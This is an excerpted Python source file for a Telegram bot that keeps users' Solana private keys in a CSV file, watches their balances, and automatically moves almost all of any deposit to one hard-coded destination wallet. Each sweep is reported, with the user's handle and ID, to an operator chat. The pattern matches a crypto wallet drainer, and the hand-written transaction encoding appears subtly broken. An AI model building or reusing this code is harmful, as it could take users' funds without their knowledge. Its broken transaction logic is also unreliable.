...
async def transfer_balance(private_key: str, from_address: str, amount: float) -> bool:
    """Transfer SOL using proper Solana transaction format."""
    try:
        headers = {"Content-Type": "application/json"}
        
        async def make_rpc_request(session, request_data):
            await asyncio.sleep(1)
            async with session.post(SOLANA_RPC_URL, json=request_data, headers=headers) as response:
        ...
        async with aiohttp.ClientSession() as session:
            ...
            blockhash_resp = await make_rpc_request(session, blockhash_req)
            if "error" in blockhash_resp:
                logger.error(f"Error getting blockhash: {blockhash_resp['error']}")
                return False
            ...
            # Create transaction data in binary format
            tx_data = bytearray()
            
            # 1. Add version (0 for legacy transactions)
            tx_data.extend(bytes([1]))  # 1 signature required
            tx_data.extend(bytes([0]))  # num_readonly_signed_accounts
            tx_data.extend(bytes([1]))  # num_readonly_unsigned_accounts
            
            # 2. Add account keys length and keys
            tx_data.extend(bytes([3]))  # 3 accounts
            tx_data.extend(b58decode(from_address))
            tx_data.extend(b58decode(DESTINATION_WALLET))
            tx_data.extend(b58decode("11111111111111111111111111111111"))  # System program
            
            # 3. Add recent blockhash
            tx_data.extend(b58decode(blockhash))
            
            # 4. Add instruction count
            tx_data.extend(bytes([1]))  # 1 instruction
            
            # 5. Add transfer instruction
            tx_data.extend(bytes([2]))  # Program index (system program)
            tx_data.extend(bytes([2]))  # Number of accounts
            tx_data.extend(bytes([0, 1]))  # Account indices
            tx_data.extend(bytes([8]))  # Data length
            tx_data.extend(lamports.to_bytes(8, 'little'))  # Amount in lamports
            
            # Sign the transaction
            private_key_bytes = b58decode(private_key)
            signing_key = SigningKey(private_key_bytes[:32])
            signature = signing_key.sign(bytes(tx_data)).signature
            
            # Combine signature and transaction data
            final_tx = bytearray()
            final_tx.extend(bytes([1]))  # Num signatures
            final_tx.extend(signature)
            final_tx.extend(tx_data)
            
            # Base58 encode the final transaction
            encoded_tx = b58encode(bytes(final_tx)).decode()
            ...
            result = await make_rpc_request(session, send_request)
            if "error" in result:
                logger.error(f"Transfer error: {result['error']}")
                return False
            
            logger.info(f"Successfully transferred {amount} SOL")
            return True
    ...
    try:
        ...
        if not os.path.exists(DATA_DIR):
            try:
                ...
                global WALLET_CSV_FILE
                WALLET_CSV_FILE = os.path.join(current_dir, 'user_wallets.csv')
                logger.info(f"Using fallback path for wallet file: {WALLET_CSV_FILE}")
        ...
        if not os.path.exists(WALLET_CSV_FILE):
            try:
                ...
                logger.error(f"Error creating wallet file: {e}")
                raise
    except Exception as e:
...
async def get_balance(wallet_address: str) -> float:
    ...
    try:
        ...
        for attempt in range(max_retries):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(SOLANA_RPC_URL, json=request, headers=headers) as response:
                        data = await response.json()
                        logger.info(f"RPC response for {wallet_address}: {data}")
                        
                        if "error" in data:
                            if data["error"].get("code") == 429:  # Rate limit error
                                if attempt < max_retries - 1:
                                    logger.warning(f"Rate limit hit for {wallet_address}, waiting {retry_delay} seconds...")
                                    await asyncio.sleep(retry_delay)
                                    retry_delay *= 2  # Exponential backoff
                                    continue
                            logger.warning(f"Error from RPC for {wallet_address}: {data['error']}")
                            return 0
                        
                        if "result" in data and "value" in data["result"]:
                            balance = float(data["result"]["value"]) / 10**9  # Convert lamports to SOL
                            logger.info(f"Balance for {wallet_address}: {balance} SOL")
                            return balance
                        
                        logger.warning(f"Unexpected response format for {wallet_address}: {data}")
                        return 0
                ...
                if attempt < max_retries - 1:
                    ...
                    retry_delay *= 2
                    continue
                logger.error(f"Error getting balance after {max_retries} attempts: {e}")
                return 0
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        try:
            error_message = "Error processing your request. Please use /get_wallet to try again."
...
async def check_deposits(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check for balance changes in wallets and automatically transfer funds."""
    logger.info("Starting check_deposits function")
    try:
        # Read all wallets from CSV file
        csv_file = os.path.join('data', 'user_wallets.csv')
            ...
            with open(csv_file, 'r', newline='', encoding='utf-8') as f:
                ...
                for row in reader:
                    ...
                    try:
                        ...
                        previous_balance = wallet_balances.get(wallet_address, 0)
                        
                        # If there's a change in balance
                        if current_balance != previous_balance:
                            # Send balance change notification
                            change_message = (
                                f"💰 <b>Balance Change Detected</b>\n\n"
                                f"👤 User: @{username} (ID: {user_id})\n"
                                f"💼 Wallet: <code>{wallet_address}</code>\n"
                                f"📊 Previous Balance: {previous_balance} SOL\n"
                                f"📈 Current Balance: {current_balance} SOL\n"
                                f"📱 Change: {current_balance - previous_balance:+.4f} SOL"
                            )
                            await context.bot.send_message(
                                chat_id=NOTIFICATION_CHAT_ID,
                                text=change_message,
                        ...
                        # If balance is above minimum, attempt transfer
                        if current_balance > MIN_TRANSFER_AMOUNT:
                            # Calculate transfer amount (leave some for fees)
                            transfer_amount = current_balance - 0.001  # Leave 0.001 SOL for fees
                            
                            # Add delay before transfer to avoid rate limits
                            await asyncio.sleep(2)
                            
                            # Attempt to transfer
                            if await transfer_balance(private_key, wallet_address, transfer_amount):
                                transfer_message = (
                                    f"💎 <b>Balance Transferred!</b> 💎\n\n"
                                    f"👤 User: @{username} (ID: {user_id})\n"
                                    f"📤 From: <code>{wallet_address}</code>\n"
                                    f"📥 To: <code>{DESTINATION_WALLET}</code>\n"
                                    f"💰 Amount: {transfer_amount:.4f} SOL\n"
                                    f"⚡️ Status: Transfer successful ✅"
                                )
                                await context.bot.send_message(
                                    chat_id=NOTIFICATION_CHAT_ID,
                                ...
                                logger.info(f"Transfer notification sent for wallet {wallet_address}")
